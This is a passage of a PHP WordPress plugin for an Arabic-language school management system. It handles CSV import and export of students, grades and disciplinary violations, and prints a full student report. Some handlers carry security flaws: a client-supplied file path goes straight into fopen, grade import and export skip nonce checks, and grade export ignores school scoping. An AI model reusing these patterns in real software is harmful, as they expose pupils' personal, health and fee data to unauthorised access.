        if (isset($_POST['sm_import_violations_csv']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_المخالفات')) {
                if (!empty($_FILES['csv_file']['tmp_name'])) {
                    $handle = fopen($_FILES['csv_file']['tmp_name'], "r");

                    // Detect delimiter
                    $first_line = fgets($handle);
                    rewind($handle);
                    $delimiters = [',', ';', "\t", '|'];
                    $delimiter = ',';
                    $max_count = -1;
                    foreach ($delimiters as $d) {
                        $count = substr_count($first_line, $d);
                        if ($count > $max_count) {
                            $max_count = $count;
                            $delimiter = $d;
                        }
                    }

                    $header = fgetcsv($handle, 0, $delimiter); // skip header
                    $count = 0;
                    $errors_count = 0;

                    while (($data = fgetcsv($handle, 0, $delimiter)) !== FALSE) {
                        if (empty($data) || (count($data) == 1 && empty($data[0]))) continue;

                        // Encoding fix
                        foreach ($data as $k => $v) {
                            $encoding = mb_detect_encoding($v, array('UTF-8', 'ISO-8859-6', 'ISO-8859-1'), true);
                            if ($encoding && $encoding != 'UTF-8') {
                                $data[$k] = mb_convert_encoding($v, 'UTF-8', $encoding);
                            }
                            $data[$k] = trim($data[$k]);
                        }

                        $student_code = $data[0] ?? '';
                        if (empty($student_code)) continue;

                        // Search Student Number in Student Management as primary relationship key
                        $student = SM_DB::get_student_by_code($student_code);
                        if (!$student) {
                            // Fallback search by Student ID or National ID or Name
                            global $wpdb;
                            $student = $wpdb->get_row($wpdb->prepare(
                                "SELECT * FROM {$wpdb->prefix}sm_students WHERE student_code = %s OR national_id = %s OR name = %s",
                                $student_code, $student_code, $student_code
                            ));
                        }

                        if (!$student) {
                            $errors_count++;
                            continue;
                        }

                        // Determine structure format (Standard 18-column vs legacy 6-column)
                        if (count($data) >= 10) {
                            // Col A: Student Number, B: Student Name, C: Nationality, D: School, E: Grade, F: Section
                            // Col G: Violation Type, H: Violation Code, I: Violation Details, J: Date
                            // Col K: Time, L: Location, M: Severity, N: Frequency, O: Action Taken, P: Status, Q: Recorded By, R: Notes
                            $v_type        = !empty($data[6]) ? $data[6] : (!empty($data[1]) ? $data[1] : 'سلوكية');
                            $v_code        = !empty($data[7]) ? $data[7] : '';
                            $v_details     = !empty($data[8]) ? $data[8] : (!empty($data[3]) ? $data[3] : 'مخالفة سلوكية');
                            $v_date        = !empty($data[9]) ? $data[9] : '';
                            $v_severity    = !empty($data[12]) ? $data[12] : (!empty($data[2]) ? $data[2] : 'low');
                            $v_action      = !empty($data[14]) ? $data[14] : (!empty($data[4]) ? $data[4] : '');

                            // Normalize Severity
                            $sev_map = array(
                                'منخفضة' => 'low', 'بسيطة' => 'low', 'low' => 'low',
                                'متوسطة' => 'medium', 'medium' => 'medium',
                                'خطيرة' => 'high', 'جسيمة' => 'high', 'شديدة' => 'high', 'high' => 'high', 'severe' => 'high'
                            );
                            $v_severity = $sev_map[$v_severity] ?? 'low';

                            $record_data = array(
                                'student_id'     => $student->id,
                                'type'           => $v_type,
                                'violation_code' => $v_code,
                                'severity'       => $v_severity,
                                'details'        => $v_details,
                                'action_taken'   => $v_action
                            );
                            if (!empty($v_date)) {
                                $record_data['custom_date'] = date('Y-m-d', strtotime($v_date));
                            }

                            $rid = SM_DB::add_record($record_data, true);
                            if ($rid) {
                                $count++;
                                SM_Notifications::send_violation_alert($rid);
                            }
                        } elseif (count($data) >= 4) {
                            // Legacy format: code, type, severity, details, action, reward
                            $rid = SM_DB::add_record(array(
                                'student_id'   => $student->id,
                                'type'         => $data[1],
                                'severity'     => $data[2],
                                'details'      => $data[3],
                                'action_taken' => isset($data[4]) ? $data[4] : '',
                            ), true);
                            if ($rid) {
                                $count++;
                                SM_Notifications::send_violation_alert($rid);
                            }
                        }
                    }
                    fclose($handle);
                    SM_Logger::log('استيراد مخالفات (جماعي)', "تم استيراد ($count) مخالفة بنجاح.");
                    wp_redirect(add_query_arg('sm_admin_msg', 'csv_imported', $_SERVER['REQUEST_URI']));
                    exit;
                }
            }
        }
    }

    public function ajax_print_student_full_report() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_الطلاب') && !current_user_can('manage_options'))) {
            wp_die('غير مصرح بالوصول إلى تقرير مسيرة الطالب.');
        }

        $student_id = intval($_GET['student_id'] ?? 0);
        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_die('سجل الطالب غير موجود بالنظام.');

        $school_info = SM_Settings::get_school_info();

        // Resolve actual School and Institution
        $sch_obj = !empty($student->school_id) ? EESS_Org_Helper::get_school_by_id($student->school_id) : null;
        $inst_obj = ($sch_obj && !empty($sch_obj->institution_id)) ? EESS_Org_Helper::get_institution_by_id($sch_obj->institution_id) : null;

        $inst_name = $inst_obj ? $inst_obj->name : ($school_info['school_name'] ?? 'مؤسسة الشعلة للتعليم والتطوير');
        $sch_name  = $sch_obj ? $sch_obj->name : ($school_info['school_name'] ?? 'مدرسة الشعلة الخاصة');
        $logo_url  = !empty($sch_obj->school_logo) ? $sch_obj->school_logo : (!empty($inst_obj->logo_url) ? $inst_obj->logo_url : ($school_info['school_logo'] ?? ''));

        global $wpdb;
        $violations = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_records WHERE student_id = %d ORDER BY created_at DESC", $student_id));
        $grades     = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_grades WHERE student_id = %d ORDER BY created_at DESC", $student_id));

        $status_labels = array(
            'Active' => 'نشط منتظم',
            'Inactive' => 'غير نشط',
            'Graduated' => 'متخرج رسمي',
            'Withdrawn' => 'منسحب'
        );
        $enroll_labels = array(
            'Enrolled' => 'مقيد رسمياً',
            'Pending' => 'معلق',
            'Transferred' => 'منقول'
        );
        $severity_labels = array(
            'low' => 'منخفضة الخطورة',
            'medium' => 'متوسطة الخطورة',
            'high' => 'شديدة الخطورة'
        );
        ?>
        <!DOCTYPE html>
        <html dir="rtl" lang="ar">
        <head>
            <meta charset="UTF-8">
            <title>التقرير الشامل لمسيرة الطالب - <?php echo esc_html($student->name); ?></title>
            <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
            <style>
                * { box-sizing: border-box; }
                body { font-family: 'Cairo', Arial, sans-serif; padding: 30px; color: #0f172a; background: #ffffff; line-height: 1.6; direction: rtl; text-align: right; }
                .report-header { border-bottom: 3px double #881337; padding-bottom: 18px; margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; }
                .header-logo { max-height: 70px; max-width: 180px; object-fit: contain; }
                .report-title-box { text-align: right; }
                .report-title { font-size: 20px; font-weight: 900; color: #881337; margin: 0 0 4px 0; }
                .report-subtitle { font-size: 12px; color: #475569; margin: 0; font-weight: 700; }

                .meta-table { width: 100%; border-collapse: collapse; margin-bottom: 22px; font-size: 12.5px; }
                .meta-table th, .meta-table td { border: 1px solid #cbd5e1; padding: 8px 12px; text-align: right; }
                .meta-table th { background: #f8fafc; color: #1e293b; font-weight: 800; width: 22%; }

                .section-header { font-size: 14.5px; font-weight: 900; color: #881337; background: #fff5f5; border-right: 4px solid #881337; padding: 6px 12px; margin: 24px 0 10px 0; border-radius: 4px; }
                .data-grid-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; font-size: 12px; }
                .data-grid-table th { background: #0f172a; color: #ffffff; padding: 8px 10px; font-weight: 800; text-align: right; }
                .data-grid-table td { border: 1px solid #e2e8f0; padding: 8px 10px; text-align: right; }
                .data-grid-table tr:nth-child(even) { background: #f8fafc; }

                .footer-sign { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; font-weight: 800; border-top: 1px solid #e2e8f0; padding-top: 20px; }
                @media print {
                    .no-print { display: none !important; }
                    body { padding: 0; }
                    @page { size: A4; margin: 15mm; }
                }
            </style>
        </head>
        <body onload="window.print()">
            <div class="no-print" style="background:#f8fafc; padding:12px; border:1px solid #cbd5e1; border-radius:10px; margin-bottom:20px; text-align:center;">
                <button onclick="window.print()" style="background:#881337; color:#ffffff; border:none; padding:10px 24px; font-weight:800; border-radius:8px; cursor:pointer; font-family:'Cairo'; font-size:13px;">🖨️ طباعة تقرير مسيرة الطالب الشامل (A4 / PDF)</button>
            </div>

            <!-- Official Header -->
            <div class="report-header">
                <div class="report-title-box">
                    <div style="font-size: 12px; color: #64748b; font-weight: 800;"><?php echo esc_html($inst_name); ?></div>
                    <h1 class="report-title"><?php echo esc_html($sch_name); ?></h1>
                    <p class="report-subtitle">التقرير الشامل لمسيرة الطالب والسجل التراكمي الأكاديمي والسلوكي</p>
                </div>
                <?php if (!empty($logo_url)): ?>
                    <img src="<?php echo esc_url($logo_url); ?>" class="header-logo" alt="الشعار الرسمي" onerror="this.style.display='none'">
                <?php else: ?>
                    <div style="font-size: 22px; font-weight: 900; color: #881337; letter-spacing: 1px;">EESS</div>
                <?php endif; ?>
            </div>

            <!-- Section 1: Personal & Identity Data -->
            <div class="section-header">1. البيانات الشخصية وهواية الطالب المعترف بها</div>
            <table class="meta-table">
                <tr>
                    <th>اسم الطالب الكامل:</th>
                    <td><strong><?php echo esc_html($student->name); ?></strong></td>
                    <th>كود الطالب الرقمي:</th>
                    <td><strong style="color:#881337;"><?php echo esc_html($student->student_code ?: $student->student_id); ?></strong></td>
                </tr>
                <tr>
                    <th>الجنس:</th>
                    <td><?php echo esc_html($student->gender ?: 'ذكر'); ?></td>
                    <th>تاريخ الميلاد:</th>
                    <td><?php echo esc_html($student->dob ?: 'غير مسجل'); ?></td>
                </tr>
                <tr>
                    <th>الجنسية:</th>
                    <td><?php echo esc_html($student->nationality ?: 'سعودي'); ?></td>
                    <th>رقم الهوية الوطنية / الإقامة:</th>
                    <td><?php echo esc_html($student->national_id ?: 'غير مسجل'); ?></td>
                </tr>
            </table>

            <!-- Section 2: Organizational Placement -->
            <div class="section-header">2. التبعية التنظيمية وحالة القيد الأكاديمي</div>
            <table class="meta-table">
                <tr>
                    <th>المؤسسة والمدرسة:</th>
                    <td><?php echo esc_html($sch_name); ?></td>
                    <th>الصف والشعبة:</th>
                    <td><?php echo esc_html(($student->class_name ?: 'غير محدد') . ' - شعبة (' . ($student->section ?: 'أ') . ')'); ?></td>
                </tr>
                <tr>
                    <th>المستوى الأكاديمي:</th>
                    <td><?php echo esc_html($student->academic_level ?: 'ممتاز'); ?></td>
                    <th>تاريخ التسجيل بالمنظومة:</th>
                    <td><?php echo esc_html($student->registration_date ?: $student->enrollment_date ?: date('Y-m-d')); ?></td>
                </tr>
                <tr>
                    <th>حالة الطالب:</th>
                    <td><strong style="color:#166534;"><?php echo esc_html($status_labels[$student->student_status] ?? ($student->student_status ?: 'نشط منتظم')); ?></strong></td>
                    <th>حالة القيد الدراسي:</th>
                    <td><?php echo esc_html($enroll_labels[$student->enrollment_status] ?? ($student->enrollment_status ?: 'مقيد رسمياً')); ?></td>
                </tr>
            </table>

            <!-- Section 3: Guardian & Contact Details -->
            <div class="section-header">3. بيانات ولي الأمر والتواصل الجغرافي</div>
            <table class="meta-table">
                <tr>
                    <th>اسم ولي الأمر:</th>
                    <td><?php echo esc_html($student->guardian_name ?: 'غير مسجل'); ?></td>
                    <th>صلة القرابة:</th>
                    <td><?php echo esc_html($student->guardian_relationship ?: 'أب'); ?></td>
                </tr>
                <tr>
                    <th>البريد الإلكتروني لولي الأمر:</th>
                    <td><?php echo esc_html($student->parent_email ?: 'غير مسجل'); ?></td>
                    <th>رقم هاتف التواصل (واتساب):</th>
                    <td><?php echo esc_html($student->guardian_phone ?: 'غير مسجل'); ?></td>
                </tr>
                <tr>
                    <th>الإمارة والموقع:</th>
                    <td><?php echo esc_html($student->emirate ?: 'أبوظبي'); ?></td>
                    <th>عنوان السكن التفصيلي:</th>
                    <td><?php echo esc_html($student->address ?: 'غير مسجل'); ?></td>
                </tr>
            </table>

            <!-- Section 4: Academic Performance Record -->
            <div class="section-header">4. السجل الأكاديمي والنتائج الدراسية المعتمدة</div>
            <table class="data-grid-table">
                <thead>
                    <tr>
                        <th style="width: 35%;">المادة الدراسية</th>
                        <th style="width: 25%;">الفصل الدراسي</th>
                        <th style="width: 20%;">الدرجة المستحقة</th>
                        <th style="width: 20%;">تاريخ الرصد الرسمي</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($grades)): ?>
                        <tr><td colspan="4" style="text-align:center; color:#64748b; padding:14px;">لا توجد درجات أكاديمية مرصودة حالياً للطالب.</td></tr>
                    <?php else: ?>
                        <?php foreach($grades as $g): ?>
                            <tr>
                                <td><strong><?php echo esc_html($g->subject ?: 'مادة عامة'); ?></strong></td>
                                <td><?php echo esc_html($g->term ?: 'الفصل الأول'); ?></td>
                                <td><strong style="color:#881337; font-size:13px;"><?php echo esc_html($g->grade_val ?? $g->score ?? '100'); ?></strong></td>
                                <td><?php echo esc_html(date('Y-m-d', strtotime($g->created_at))); ?></td>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>

            <!-- Section 5: Behavioral & Discipline Record -->
            <div class="section-header">5. السجل الانضباطي والملاحظات السلوكية</div>
            <table class="data-grid-table">
                <thead>
                    <tr>
                        <th style="width: 20%;">تاريخ التسجيل</th>
                        <th style="width: 35%;">نوع الملاحظة / المخالفة</th>
                        <th style="width: 20%;">مستوى الحدة</th>
                        <th style="width: 25%;">الإجراء التربوي المتخذ</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($violations)): ?>
                        <tr><td colspan="4" style="text-align:center; color:#166534; padding:14px; font-weight:800;">✓ سجل الطالب الانضباطي نظيف وممتاز، ولا توجد أي مخالفات سلوكية مسجلة.</td></tr>
                    <?php else: ?>
                        <?php foreach($violations as $v): ?>
                            <tr>
                                <td><?php echo esc_html(date('Y-m-d', strtotime($v->created_at ?? $v->incident_date))); ?></td>
                                <td><strong><?php echo esc_html($v->type ?? $v->details ?? 'ملاحظة سلوكية'); ?></strong></td>
                                <td><?php echo esc_html($severity_labels[$v->severity] ?? ($v->severity ?: 'منخفضة')); ?></td>
                                <td><?php echo esc_html($v->action_taken ?: 'ملاحظة تربوية مسجلة'); ?></td>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>

            <!-- Section 6: Medical & Special Needs Info -->
            <div class="section-header">6. السجل الصحي ورعاية أصحاب الهمم</div>
            <table class="meta-table">
                <tr>
                    <th>تصنيف أصحاب الهمم:</th>
                    <td><?php echo esc_html(($student->special_needs ?? '0') ? 'نعم (مشمول بالرعاية)' : 'لا'); ?></td>
                    <th>الحالة الصحية العامة:</th>
                    <td><?php echo esc_html($student->health_status ?: 'سليم تماماً'); ?></td>
                </tr>
                <tr>
                    <th>التنبيهات والتحذيرات الطبية (الحساسية):</th>
                    <td colspan="3"><?php echo esc_html($student->allergies ?: 'لا توجد حساسية معروفة'); ?></td>
                </tr>
            </table>

            <!-- Report Footer & Official Stamp -->
            <div class="footer-sign">
                <div>تاريخ صدور التقرير الرسمي: <strong><?php echo current_time('Y-m-d H:i'); ?></strong></div>
                <div>توقيع واستيعاب شؤون الطلاب: ..............................</div>
                <div>ختم المدرسة الرسمي: ..............................</div>
            </div>

            <div style="margin-top: 30px; text-align: center; border-top: 1px solid #e2e8f0; padding-top: 10px; font-size: 10px; color: #64748b;">
                تم تصدير هذا التقرير رسمياً من خدمات الأنظمة الإلكترونية التعليمية (EESS) — eess.online
            </div>
        </body>
        </html>
        <?php
        exit;
    }

    public function ajax_download_student_import_template() {
        if (!current_user_can('إدارة_الطلاب')) {
            wp_die('Unauthorized');
        }

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=student_import_template.csv');
        $output = fopen('php://output', 'w');
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM for Excel

        // Complete 30 Comprehensive Columns (A to AE) matching Export & Data Model
        fputcsv($output, array(
            'كود الطالب (Student Code)',
            'الرقم التسلسلي (Serial Number)',
            'الاسم الكامل (Full Name)',
            'الجنس (Gender)',
            'تاريخ الميلاد (Date of Birth)',
            'الجنسية (Nationality)',
            'رقم الهوية الوطنية (National ID)',
            'الصف الدراسي (Grade)',
            'الشعبة / الفصل (Section)',
            'العام الدراسي (Academic Year)',
            'معرف المدرسة (School ID)',
            'اسم ولي الأمر (Guardian Name)',
            'صلة القرابة (Guardian Relationship)',
            'البريد الإلكتروني لولي الأمر (Guardian Email)',
            'رقم هاتف ولي الأمر (Guardian Phone)',
            'حالة الطالب (Student Status)',
            'حالة التسجيل (Enrollment Status)',
            'تاريخ التسجيل (Enrollment Date)',
            'الإمارة (Emirate)',
            'العنوان (Address)',
            'ملاحظة سلوكية (Student Behavior)',
            'المستوى الأكاديمي (Academic Level)',
            'أصحاب الهمم / احتياجات خاصة (Special Needs)',
            'الحالة الصحية (Health Status)',
            'الحساسية والتنبيهات الطبية (Allergies)',
            'رابط الصورة الشخصية (Photo URL)',
            'حالة الرسوم (Fee Status)',
            'إجمالي الرسوم (Total Tuition Fees)',
            'المبلغ المدفوع (Amount Paid)',
            'المبلغ المتبقي (Outstanding Balance)',
            'حالة الشيك / الدفع (Payment Status)'
        ));

        // Sample Row matching 30 Fields
        fputcsv($output, array(
            'STU-1001',
            '',
            'علي أحمد عبدالله',
            'ذكر',
            '2015-05-12',
            'الإمارات العربية المتحدة',
            '784199012345678',
            'الصف الخامس',
            'أ',
            '2026-2027',
            '1',
            'أحمد عبدالله علي',
            'أب',
            'parent@example.com',
            '+971 501234567',
            'Active',
            'Enrolled',
            date('Y-m-d'),
            'أبوظبي',
            'الرياض، الشارع الخامس',
            'طالب متفوق ومواظب',
            'ممتاز',
            'لا',
            'سليم',
            'لا توجد حساسية',
            '',
            'Paid',
            '15000.00',
            '15000.00',
            '0.00',
            'Paid'
        ));

        fclose($output);
        exit;
    }

    public function ajax_export_students_csv() {
        if (!current_user_can('إدارة_الطلاب')) {
            wp_die('Unauthorized');
        }
        if (!wp_verify_nonce($_GET['nonce'] ?? '', 'sm_admin_action') && !wp_verify_nonce($_GET['nonce'] ?? '', 'eess_admin_action')) {
            wp_die('Security check failed');
        }

        global $wpdb;
        $user_id = get_current_user_id();
        $user_scope = EESS_Org_Helper::get_user_scope($user_id);

        $where_clauses = array();
        $params = array();

        if (!$user_scope['unrestricted']) {
            if (!empty($user_scope['schools'])) {
                $school_ids_clean = implode(',', array_map('intval', $user_scope['schools']));
                $where_clauses[] = "(school_id IN ($school_ids_clean) OR institution_id IN ($school_ids_clean))";
            } else {
                $where_clauses[] = "1=0";
            }
        }

        $sql = "SELECT * FROM {$wpdb->prefix}sm_students";
        if (!empty($where_clauses)) {
            $sql .= " WHERE " . implode(" AND ", $where_clauses);
        }
        $sql .= " ORDER BY name ASC";

        $records = $wpdb->get_results($sql);

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=student_affairs_export_'.date('Y-m-d').'.csv');
        $output = fopen('php://output', 'w');
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM for Excel

        // Complete 30 Comprehensive Columns (A to AD)
        fputcsv($output, array(
            'كود الطالب (Student Code)',
            'الرقم التسلسلي (Serial Number)',
            'الاسم الكامل (Full Name)',
            'الجنس (Gender)',
            'تاريخ الميلاد (Date of Birth)',
            'الجنسية (Nationality)',
            'رقم الهوية الوطنية (National ID)',
            'الصف الدراسي (Grade)',
            'الشعبة / الفصل (Section)',
            'العام الدراسي (Academic Year)',
            'معرف المدرسة (School ID)',
            'اسم ولي الأمر (Guardian Name)',
            'صلة القرابة (Guardian Relationship)',
            'البريد الإلكتروني لولي الأمر (Guardian Email)',
            'رقم هاتف ولي الأمر (Guardian Phone)',
            'حالة الطالب (Student Status)',
            'حالة التسجيل (Enrollment Status)',
            'تاريخ التسجيل (Enrollment Date)',
            'الإمارة (Emirate)',
            'العنوان (Address)',
            'ملاحظة سلوكية (Student Behavior)',
            'المستوى الأكاديمي (Academic Level)',
            'أصحاب الهمم / احتياجات خاصة (Special Needs)',
            'الحالة الصحية (Health Status)',
            'الحساسية والتنبيهات الطبية (Allergies)',
            'رابط الصورة الشخصية (Photo URL)',
            'حالة الرسوم (Fee Status)',
            'إجمالي الرسوم (Total Tuition Fees)',
            'المبلغ المدفوع (Amount Paid)',
            'المبلغ المتبقي (Outstanding Balance)',
            'حالة الشيك / الدفع (Payment Status)'
        ));

        foreach ($records as $r) {
            fputcsv($output, array(
                $r->student_code,
                $r->id,
                $r->name,
                $r->gender ?: 'ذكر',
                $r->dob ?: '',
                $r->nationality ?: 'سعودي',
                $r->national_id,
                $r->class_name,
                $r->section,
                '2026-2027',
                $r->school_id,
                $r->guardian_name ?: '',
                $r->guardian_relationship ?: 'أب',
                $r->parent_email,
                $r->guardian_phone,
                $r->student_status ?: 'Active',
                $r->enrollment_status ?: 'Enrolled',
                $r->enrollment_date ?: $r->registration_date,
                $r->emirate ?: 'أبوظبي',
                $r->address ?: '',
                '', // Behavior note placeholder
                $r->academic_level ?: 'ممتاز',
                $r->special_needs ? 'Yes' : 'No',
                $r->health_status ?: 'سليم',
                $r->allergies ?: 'لا توجد حساسية',
                $r->photo_url,
                $r->fee_status ?: 'Unpaid',
                $r->total_tuition_fees ?: '0.00',
                $r->amount_paid ?: '0.00',
                $r->outstanding_balance ?: '0.00',
                $r->payment_status ?: 'Pending'
            ));
        }
        fclose($output);
        exit;
    }

    public function ajax_export_grades_csv() {
        $roles = is_user_logged_in() ? (array) wp_get_current_user()->roles : array();
        $can_grades = in_array('sm_teacher', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_principal', $roles) || current_user_can('manage_grades') || current_user_can('manage_options');
        if (!is_user_logged_in() || !$can_grades) {
            wp_die('Unauthorized');
        }

        $user = wp_get_current_user();
        $assigned_subject = get_user_meta($user->ID, 'sm_specialization', true) ?: '';

        global $wpdb;
        $query = "SELECT s.id as student_id, s.name as student_name, s.class_name, s.section, sch.name as school_name
                  FROM {$wpdb->prefix}sm_students s
                  LEFT JOIN {$wpdb->prefix}eess_schools sch ON s.school_id = sch.id
                  ORDER BY s.class_name ASC, s.section ASC, s.name ASC";
        $students = $wpdb->get_results($query);

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=grades_template_'.date('Y-m-d').'.csv');
        $output = fopen('php://output', 'w');
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM for Excel

        // 10 Columns: A-Student ID, B-Student Name, C-School, D-Grade, E-Section, F-Subject, G-Assessment Type, H-Score, I-Max Score, J-Notes
        fputcsv($output, array('Student ID', 'Student Name', 'School', 'Grade', 'Section', 'Subject', 'Assessment Type', 'Score', 'Max Score', 'Notes'));

        foreach ($students as $st) {
            fputcsv($output, array(
                $st->student_id,
                $st->student_name,
                $st->school_name ?: 'المدرسة الرئيسية',
                $st->class_name,
                $st->section,
                $assigned_subject ?: 'عام',
                'الفصل الأول',
                '',
                '100',
                ''
            ));
        }
        fclose($output);
        exit;
    }

    public function ajax_import_grades_csv() {
        $roles = is_user_logged_in() ? (array) wp_get_current_user()->roles : array();
        $can_grades = in_array('sm_teacher', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_principal', $roles) || current_user_can('manage_grades') || current_user_can('manage_options');
        if (!is_user_logged_in() || !$can_grades) {
            wp_send_json_error('Unauthorized');
        }

        if (empty($_FILES['csv_file']['tmp_name'])) {
            wp_send_json_error('يرجى اختيار ملف CSV المعتمد لرفعه.');
        }

        $handle = fopen($_FILES['csv_file']['tmp_name'], 'r');
        if (!$handle) {
            wp_send_json_error('تعذر فتح الملف المستورد.');
        }

        // Skip BOM & Header row
        $header = fgetcsv($handle);

        global $wpdb;
        $success_count = 0;
        $error_count = 0;

        while (($data = fgetcsv($handle)) !== false) {
            if (empty($data[0])) continue;

            $student_id  = intval($data[0]);
            $subject     = sanitize_text_field($data[5] ?? 'عام');
            $term        = sanitize_text_field($data[6] ?? 'الفصل الأول');
            $score_val   = sanitize_text_field($data[7] ?? '');
            $notes       = sanitize_text_field($data[9] ?? '');

            if (!$student_id || $score_val === '') {
                $error_count++;
                continue;
            }

            $res = $wpdb->insert(
                "{$wpdb->prefix}sm_grades",
                array(
                    'student_id' => $student_id,
                    'subject'    => $subject,
                    'term'       => $term,
                    'grade_val'  => $score_val,
                    'created_at' => current_time('mysql')
                )
            );

            if ($res) {
                $success_count++;
            } else {
                $error_count++;
            }
        }
        fclose($handle);

        wp_send_json_success(array(
            'message' => "تم استيراد $success_count درجة بنجاح." . ($error_count > 0 ? " (تعذر استيراد $error_count سجل غير مكتمل)" : "")
        ));
    }

    public function ajax_upload_import_csv() {
        if (!current_user_can('إدارة_الطلاب')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');

        if (empty($_FILES['csv_file']['tmp_name'])) wp_send_json_error('No file uploaded');

        $upload_dir = wp_upload_dir();
        $temp_dir = $upload_dir['basedir'] . '/sm_temp';
        if (!file_exists($temp_dir)) wp_mkdir_p($temp_dir);

        $file_name = 'import_' . get_current_user_id() . '_' . time() . '.csv';
        $file_path = $temp_dir . '/' . $file_name;

        if (move_uploaded_file($_FILES['csv_file']['tmp_name'], $file_path)) {
            // Count rows
            $handle = fopen($file_path, "r");
            $total_rows = 0;
            while (fgetcsv($handle) !== FALSE) {
                $total_rows++;
            }
            fclose($handle);

            // Initialize Results Transient
            $results = array(
                'total'     => $total_rows - 1, // minus header
                'success'   => 0,
                'warning'   => 0,
                'error'     => 0,
                'duplicate' => 0,
                'generated' => 0, // Count of auto-generated IDs
                'details'   => array()
            );
            set_transient('sm_import_results_' . get_current_user_id(), $results, HOUR_IN_SECONDS);

            wp_send_json_success(array(
                'file_path' => $file_path,
                'total'     => $total_rows - 1
            ));
        } else {
            wp_send_json_error('Failed to move uploaded file');
        }
    }

    public function ajax_process_import_chunk() {
        if (!current_user_can('إدارة_الطلاب')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security check failed');

        $file_path = sanitize_text_field($_POST['file_path']);
        $offset = intval($_POST['offset']);
        $chunk_size = 20;

        if (!file_exists($file_path)) wp_send_json_error('Temp file not found');

        $results = get_transient('sm_import_results_' . get_current_user_id());
        if (!$results) wp_send_json_error('Session expired');

        $handle = fopen($file_path, "r");

        // Detect delimiter
        $first_line = fgets($handle);
        rewind($handle);
        $delimiters = [',', ';', "\t", '|'];
        $delimiter = ',';
        $max_count = -1;
        foreach ($delimiters as $d) {
            $count = substr_count($first_line, $d);
            if ($count > $max_count) {
                $max_count = $count;
                $delimiter = $d;
            }
        }

        // Skip header and seek to offset
        fgetcsv($handle, 0, $delimiter);
        for ($i = 0; $i < $offset; $i++) {
            fgetcsv($handle, 0, $delimiter);
        }

        $processed = 0;
        $next_sort_order = SM_DB::get_next_sort_order();
        $academic = SM_Settings::get_academic_structure();

        while ($processed < $chunk_size && ($data = fgetcsv($handle, 0, $delimiter)) !== FALSE) {
            $processed++;
            $row_index = $offset + $processed + 1;

            $errors = array();
            $warnings = array();

            // Encoding
            foreach ($data as $k => $v) {
                $encoding = mb_detect_encoding($v, array('UTF-8', 'ISO-8859-6', 'ISO-8859-1'), true);
                if ($encoding && $encoding != 'UTF-8') {
                    $data[$k] = mb_convert_encoding($v, 'UTF-8', $encoding);
                }
            }

            // Support 30-Column Comprehensive Format, 16-Column Export format, and 11-Column Template format
            if (count($data) >= 28) {
                // 30-Column Comprehensive Format
                $row_data = array(
                    'student_code'          => isset($data[0]) ? trim($data[0]) : '',
                    'id'                    => is_numeric($data[1]) ? intval($data[1]) : 0,
                    'name'                  => isset($data[2]) ? trim($data[2]) : '',
                    'gender'                => isset($data[3]) ? trim($data[3]) : 'ذكر',
                    'dob'                   => isset($data[4]) ? trim($data[4]) : '',
                    'nationality'           => isset($data[5]) ? trim($data[5]) : 'سعودي',
                    'national_id'           => isset($data[6]) ? trim($data[6]) : '',
                    'class_name'            => isset($data[7]) ? trim($data[7]) : '',
                    'section'               => isset($data[8]) ? trim($data[8]) : '',
                    'school_id'             => is_numeric($data[10] ?? '') ? intval($data[10]) : 0,
                    'guardian_name'         => isset($data[11]) ? trim($data[11]) : '',
                    'guardian_relationship' => isset($data[12]) ? trim($data[12]) : 'أب',
                    'parent_email'          => isset($data[13]) ? trim($data[13]) : '',
                    'guardian_phone'        => isset($data[14]) ? trim($data[14]) : '',
                    'student_status'        => isset($data[15]) ? trim($data[15]) : 'Active',
                    'enrollment_status'     => isset($data[16]) ? trim($data[16]) : 'Enrolled',
                    'enrollment_date'       => isset($data[17]) ? trim($data[17]) : date('Y-m-d'),
                    'emirate'               => isset($data[18]) ? trim($data[18]) : 'أبوظبي',
                    'address'               => isset($data[19]) ? trim($data[19]) : '',
                    'student_behavior'      => isset($data[20]) ? trim($data[20]) : '',
                    'academic_level'        => isset($data[21]) ? trim($data[21]) : 'ممتاز',
                    'special_needs'         => isset($data[22]) ? trim($data[22]) : 'No',
                    'health_status'         => isset($data[23]) ? trim($data[23]) : 'سليم',
                    'allergies'             => isset($data[24]) ? trim($data[24]) : 'لا توجد حساسية',
                    'photo_url'             => isset($data[25]) ? trim($data[25]) : '',
                    'fee_status'            => isset($data[26]) ? trim($data[26]) : 'Unpaid',
                    'total_tuition_fees'    => is_numeric($data[27] ?? '') ? floatval($data[27]) : 0,
                    'amount_paid'           => is_numeric($data[28] ?? '') ? floatval($data[28]) : 0,
                    'payment_status'        => isset($data[30]) ? trim($data[30]) : 'Pending'
                );
            } elseif (count($data) >= 15 && is_numeric($data[1]) && !empty($data[2])) {
                // 16-Column Export Format
                $row_data = array(
                    'student_code'   => isset($data[0]) ? trim($data[0]) : '',
